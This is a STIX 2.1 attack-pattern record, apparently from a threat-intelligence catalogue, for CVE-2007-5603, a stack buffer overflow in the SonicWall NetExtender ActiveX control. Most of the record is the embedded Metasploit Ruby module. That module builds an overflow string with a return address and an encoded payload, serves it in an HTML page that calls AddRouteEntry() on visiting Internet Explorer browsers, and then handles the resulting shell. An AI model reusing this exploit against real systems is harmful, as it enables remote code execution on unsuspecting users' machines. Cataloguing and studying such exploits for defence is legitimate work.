{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dce6276e-0f8b-4436-bd11-c83049281c84",
    "created": "2024-08-14T16:40:40.993912Z",
    "modified": "2024-08-14T16:40:40.993917Z",
    "name": "SonicWall SSL-VPN NetExtender ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in SonicWall SSL-VPN NetExtender. By sending an overly long string to the \"AddRouteEntry()\" method located in the NELaunchX.dll (1.0.0.26) Control, an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/sonicwall_addrouteentry.rb",
            "external_id": "sonicwall_addrouteentry.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-5603"
        },
        {
            "source_name": "reference",
            "url": "http://www.sec-consult.com/303.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'SonicWall SSL-VPN NetExtender ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in SonicWall SSL-VPN NetExtender.\n        By sending an overly long string to the \"AddRouteEntry()\" method located\n        in the NELaunchX.dll (1.0.0.26) Control, an attacker may be able to execute\n        arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-5603'],\n          [ 'OSVDB', '39069'],\n          [ 'URL', 'http://www.sec-consult.com/303.html' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 800,\n          'BadChars'      => \"\\x00\\x09\\x0a\\x0d'\\\\\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'IE 6 / Windows XP SP2 Pro English',     { 'Ret' => 0x7e497c7b } ], # 11/01/07\n        ],\n      'DisclosureDate' => '2007-11-01',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n      false\n  end\n\n  def check_dependencies\n      use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Randomize some things\n    vname\t= rand_text_alpha(rand(100) + 1)\n    strname\t= rand_text_alpha(rand(100) + 1)\n\n    # Set the exploit buffer\n    sploit =  rand_text_english(36) + [target.ret].pack('V')\n    sploit << p.encoded + rand_text_english(1024 - p.encoded.length)\n\n    # Build out the message\n    content = %Q|<html>\n      <object classid='clsid:6EEFD7B1-B26C-440D-B55A-1EC677189F30' id='#{vname}'></object>\n      <script language='javascript'>\n      var #{vname} = document.getElementById('#{vname}');\n      var #{strname} = new String('#{sploit}');\n      #{vname}.AddRouteEntry(#{strname}, #{vname});\n      </script>\n      </html>\n      |\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response_html(cli, content)\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-11-01",
    "x_mitre_platforms": [
        "win'"
    ]
}